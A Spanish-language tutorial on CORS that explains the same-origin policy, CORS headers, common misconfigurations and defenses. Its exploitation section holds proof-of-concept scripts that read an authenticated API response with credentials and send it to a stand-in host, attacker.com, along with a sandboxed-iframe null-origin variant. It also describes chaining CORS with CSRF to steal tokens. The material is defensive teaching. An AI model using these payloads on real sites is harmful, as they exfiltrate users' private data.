---
icon: folder-open
---

# Cross-origin resource sharing (CORS)

### 🔍 ¿Qué es CORS?

**Cross-Origin Resource Sharing (CORS)** es un mecanismo de seguridad del navegador que controla qué orígenes pueden leer respuestas de otro origen distinto.

Las vulnerabilidades CORS ocurren cuando una mala configuración permite a orígenes maliciosos acceder a datos sensibles.

#### 🛡️ Same-Origin Policy (SOP)

```
https://example.com:443/page
 └─┬─┘  └───┬──────┘ └┬┘
Protocolo   Dominio    Puerto
```

Los tres deben coincidir para ser el mismo origen.

#### 🌐 Cómo CORS relaja SOP

```javascript
fetch('https://api.example.com/data')
```

Por defecto → bloqueado.

Si el servidor responde:

```http
Access-Control-Allow-Origin: https://trusted.com
```

→ ese dominio puede leer la respuesta.

***

### 📋 Cabeceras CORS

#### 📤 Cabeceras de request

```http
Origin: https://attacker.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom-Header
```

#### 📤 Cabeceras de respuesta

```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
```

***

### ❌ Mala configuración de CORS

#### 🔄 Reflexión del Origin

```http
Origin: https://evil.com
```

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

El servidor acepta cualquier origen → vulnerable.

#### 🛑 Confianza en `null`

```http
Origin: null
```

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 
```

Puede explotarse con iframes sandbox.

#### 🔗 Confianza en subdominios

```python
if origin.endswith('.example.com'):
```

Un XSS en un subdominio rompe la seguridad.

#### ⚠️ Regex débil

```python
re.match(r'.*victim\.com', origin)
```

Permite:

* evil.com.victim.com
* evilvictim.com

***

### ⚔️ Explotación de CORS

#### 🔄 Reflexión de Origin

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    fetch('https://attacker.com/log?data=' + this.responseText);
};
req.open('GET', 'https://victim.com/api/user', true);
req.withCredentials = true;
req.send();
</script>
```

#### 🧱 Ataque con `null` origin

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    parent.postMessage(this.responseText, '*');
};
req.open('GET', 'https://victim.com/api/user', true);
req.withCredentials = true;
req.send();
</script>
"></iframe>
```

#### 🕳️ Cadena con XSS en subdominio

```javascript
var req = new XMLHttpRequest();
req.open("GET", "https://victim.com/api/user", true);
req.withCredentials = true;
req.onload = function() {
    location="https://attacker.com/log?data=" + this.responseText;
};
req.send();
```

***

### ⚖️ CORS vs CSRF

| Aspecto | CSRF                     | CORS                     |
| ------- | ------------------------ | ------------------------ |
| Ataque  | Ejecuta acciones         | Lee datos                |
| Explota | Credenciales automáticas | Configuración incorrecta |
| Defensa | Tokens CSRF              | Cabeceras CORS           |
| Impacto | Cambios de estado        | Exfiltración de datos    |

#### 🔗 Combinación de ataques

1. Usar CORS para robar token CSRF
2. Usar CSRF para ejecutar acciones

***

### 🛡️ Defensa en CORS

#### 📋 Lista blanca de orígenes

```python
ALLOWED_ORIGINS = ['https://app.example.com']
```

#### 🚫 No reflejar el Origin

```python
# Incorrecto
response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
```

#### ❌ Evitar `null`

```python
if request.headers.get('Origin') == 'null':
    abort(403)
```

#### 🔒 Regex segura

```python
re.match(r'^https://[a-z0-9-]+\.example\.com$', origin)
```

#### 🚫 No confiar en todos los subdominios

* Un solo XSS rompe todo el sistema
* Mejor usar lista blanca específica
